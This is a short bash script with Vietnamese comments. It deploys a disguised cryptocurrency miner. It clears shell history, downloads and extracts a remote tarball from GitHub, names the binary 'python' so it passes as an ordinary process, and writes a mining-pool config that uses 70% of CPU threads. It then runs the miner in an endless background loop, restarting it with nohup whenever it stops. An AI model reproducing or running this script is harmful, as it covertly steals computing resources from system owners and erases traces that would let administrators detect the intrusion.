#!/bin/bash

DOMAIN="$1"
NAME_WORK="$2"
PROCESS_PATH="python/python"    # file thực thi
PROCESS_NAME="python"           # tên tiến trình hiển thị
CONFIG_FILE="config.json"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/$PROCESS_PATH" ]; then
    rm -rf python python.tar.gz
    curl -sL -o python.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/python.tar.gz
    tar -xzf python.tar.gz
    chmod +x python/python
    rm -f python.tar.gz
fi

# 📝 Tạo config.json nếu chưa tồn tại
if [ ! -f "$CONFIG_FILE" ]; then
    echo "[+] Chưa có $CONFIG_FILE → tạo mới"
    cat > "$CONFIG_FILE" <<EOF
{
  "autosave": true,
  "background": true,
  "api": {
    "id": null,
    "worker-id": "$NAME_WORK"
  },
  "pools": [
    {
      "url": "$DOMAIN",
      "user": "$NAME_WORK",
      "keepalive": true,
      "tls": true
    }
  ],
  "cpu": {
    "enabled": true,
    "max-threads-hint": 70
  }
}
EOF
else
    echo "[+] Đã có $CONFIG_FILE"
fi

# 🔁 Vòng lặp kiểm tra tiến trình và chạy lại nếu chưa chạy
while true; do
    if ! pgrep -f "$PROCESS_NAME -c $CONFIG_FILE" > /dev/null; then
        echo "[+] process not running , start process ..."
        nohup "$(pwd)/$PROCESS_PATH" -c "$CONFIG_FILE" > /dev/null 2>&1 &
    else
        echo "[+] process running process running process running , wait process sleep 30s..."
    fi
    sleep 15
done
